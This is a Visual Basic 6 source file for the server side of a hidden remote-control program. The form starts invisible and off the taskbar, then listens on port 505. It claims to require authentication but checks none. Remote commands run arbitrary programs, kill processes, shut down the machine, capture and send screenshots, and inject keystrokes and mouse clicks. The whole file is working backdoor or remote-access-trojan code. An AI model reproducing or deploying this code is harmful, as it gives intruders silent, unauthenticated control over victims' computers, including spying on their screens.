VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Begin VB.Form frmServer 
   BorderStyle     =   3  'Fixed Dialog
   ClientHeight    =   420
   ClientLeft      =   45
   ClientTop       =   45
   ClientWidth     =   420
   ControlBox      =   0   'False
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   420
   ScaleWidth      =   420
   ShowInTaskbar   =   0   'False
   Visible         =   0   'False
   Begin VB.ListBox List1 
      Height          =   450
      Left            =   480
      TabIndex        =   0
      Top             =   0
      Width           =   2175
   End
   Begin MSWinsockLib.Winsock Server 
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   505
   End
End
Attribute VB_Name = "frmServer"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Public Chat As Boolean
Public ChatUser As String

Private Sub Form_Load()
On Error Resume Next
Server.Close
Server.Listen
sListening = True
Hide
End Sub

Private Sub Form_Unload(Cancel As Integer)
On Error Resume Next
Server.Close
End Sub

Private Sub Server_Close()
On Error Resume Next
Server.Close
Server.Listen
sConnected = False
sListening = True
End Sub

Private Sub Server_Connect()
sConnected = True
sListening = False
End Sub

Private Sub Server_ConnectionRequest(ByVal requestID As Long)
On Error Resume Next
If Server.State <> sckClosed Then Server.Close
Server.Accept requestID
Server.SendData "Connected.  Authenticate."
sConnected = True
sListening = False
End Sub

Private Sub Server_DataArrival(ByVal bytesTotal As Long)
'On Error GoTo err
Dim Data As String
Dim Success As Boolean
Dim sk As Integer, sk2 As Integer
Dim mclick As Variant
Server.GetData Data

If LCase(Mid(Data, 1, 6)) = "spawn " Then
    Shell Mid(Data, 7), vbNormalFocus
    Server.SendData "Success"
ElseIf LCase(Mid(Data, 1, 10)) = "terminate " Then
    Success = KillTask(Trim(Mid(Data, 11)))
    If Success = True Then Server.SendData "Success"
    If Success = False Then Server.SendData "Fail!"
ElseIf LCase(Mid(Data, 1, 4)) = "apps" Then
    Server.SendData "apps:" & vbCrLf & AppsRunning(List1)
ElseIf LCase(Mid(Data, 1, 8)) = "shutdown" Then
    Server.SendData "Shutting down..."
    Server.Close
    Shutdown
ElseIf LCase(Mid(Data, 1, 8)) = "restart" Then
    Server.SendData "Restarting..."
    Server.Close
    Restart
ElseIf LCase(Mid(Data, 1, 5)) = "chat " Then
    frmChat.Show
    Chat = True
    ChatUser = Mid(Data, 6)
    Beep
    frmChat.AddText "Client Established Chat Connection" & vbCrLf
    Server.SendData "Chat Connection Established"
ElseIf LCase(Mid(Data, 1, 3)) = "im " Then
    If Chat = True Then
        Beep
        frmChat.AddText ChatUser & "> " & Mid(Data, 4)
    Else
        Server.SendData "Error: Chat not active"
    End If
ElseIf LCase(Mid(Data, 1, 7)) = "endchat" Then
    If Chat = True Then
        Chat = False
        ChatUser = ""
        Unload frmChat
    Else
        Server.SendData "Error: Chat not active"
    End If
ElseIf LCase(Mid(Data, 1, 4)) = "msg " Then
    MsgBox Mid(Data, 5), vbExclamation, "Message"
    Server.SendData "Confirmed Message"
ElseIf LCase(Mid(Data, 1, 3)) = "ss " Then
    If Val(Mid(Data, 4)) = 0 Then
        Server.SendData "Invalid quality"
    End If
    TakeSS "C:\ss.jpg", Val(Mid(Data, 4))
    SendFile "C:\ss.jpg", "C:\ss.jpg"
    Server.SendData "ssdone"
ElseIf LCase(Data) = "hide" Then
    HideMe
ElseIf LCase(Data) = "show" Then
    ShowMe
ElseIf LCase(Data) = "endserver" Then
    Server.Close
    End
ElseIf LCase(Data) = "ping" Then
    Server.SendData "pong"
End If

Wait

sk = 1

skSearch:
sk = InStr(sk, Data, "sk ")
If sk <> 0 Then
    sk = sk + 3
    sk2 = InStr(sk, Data, ";")
    If sk2 = 0 Then Exit Sub
    ProcessSendKey Mid(Data, sk, sk2 - sk)
    GoTo skSearch
End If

sk = 1

mSearch:
sk = InStr(sk, Data, "mclick ")
If sk <> 0 Then
    sk = sk + 7
    sk2 = InStr(sk, Data, ";")
    If sk2 = 0 Then Exit Sub
    mclick = Split(Mid(Data, sk, sk2 - sk), ",")
    MouseClick Trim(Val(mclick(0))), Trim(Val(mclick(1)))
    GoTo mSearch
End If


Exit Sub

err:
On Error Resume Next
Server.SendData "Error: " & err.Description
End Sub

Private Sub Server_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Server.SendData "Error: " & Description
End Sub

Public Sub ProcessSendKey(sKey1)
Dim sk
On Error GoTo err

If sKey1 = 8 Then sk = "{BKSP}"
If sKey1 = 13 Then sk = "{ENTER}"
If sKey1 = 27 Then sk = "{ESC}"
If sKey1 = 38 Then sk = "{UP}"
If sKey1 = 40 Then sk = "{DOWN}"
If sKey1 = 37 Then sk = "{LEFT}"
If sKey1 = 39 Then sk = "{RIGHT}"
If sKey1 = 19 Then sk = "{BREAK}"
If sKey1 = 35 Then sk = "{END}"
If sKey1 = 9 Then sk = "{TAB}"
If sKey1 = 145 Then sk = "{SCROLLLOCK}"
If sKey1 = 144 Then sk = "{NUMLOCK}"
If sKey1 = 33 Then sk = "{PGUP}"
If sKey1 = 34 Then sk = "{PGDN}"
If sKey1 = 45 Then sk = "{INSERT}"
If sKey1 = 36 Then sk = "{HOME}"
If sKey1 = 46 Then sk = "{DEL}"
If sKey1 = 20 Then sk = "{CAPSLOCK}"
If sKey1 = 112 Then sk = "{F1}"
If sKey1 = 113 Then sk = "{F2}"
If sKey1 = 114 Then sk = "{F3}"
If sKey1 = 115 Then sk = "{F4}"
If sKey1 = 116 Then sk = "{F5}"
If sKey1 = 117 Then sk = "{F6}"
If sKey1 = 118 Then sk = "{F7}"
If sKey1 = 119 Then sk = "{F8}"
If sKey1 = 120 Then sk = "{F9}"
If sKey1 = 121 Then sk = "{F10}"
If sKey1 = 122 Then sk = "{F11}"
If sKey1 = 123 Then sk = "{F12}"
'If sKey1 = 16 Or sKey1 = 17 Or sKey1 = 18 Or sKey1 = 91 Or sKey1 = 93 Then Exit Sub

If sk = "" Then sk = Chr(sKey1)

SendKeys sk
Server.SendData "sks " & sk

Exit Sub
err:
Server.SendData "Error in SendKey: " & err.Description
End Sub

Private Sub Server_SendComplete()
sWait = False
End Sub

Private Sub Server_SendProgress(ByVal bytesSent As Long, ByVal bytesRemaining As Long)
On Error Resume Next
sWait = True
End Sub
